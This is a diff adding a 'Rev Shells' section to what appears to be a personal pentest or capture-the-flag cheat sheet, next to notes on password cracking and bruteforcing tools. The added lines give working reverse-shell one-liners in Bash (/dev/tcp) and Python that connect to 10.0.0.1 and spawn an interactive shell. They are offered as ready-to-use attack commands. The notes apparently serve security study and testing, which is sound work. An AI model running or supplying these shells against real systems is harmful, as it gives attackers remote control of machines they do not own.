@@ -32,6 +32,13 @@
  - Johntheripper for any rsa based stuff
  - hashcat for bruteforcing hashes
  
+ # Rev Shells
+  - msfconsole
+  - Bash: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+  - Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  - php: Consult pentest monkey
+  - 
+ 
  # Bruteforcing 
  - For ssh and ftp use hydra
  - for website bruteforcing using either burpsuite intruder module or make one with python
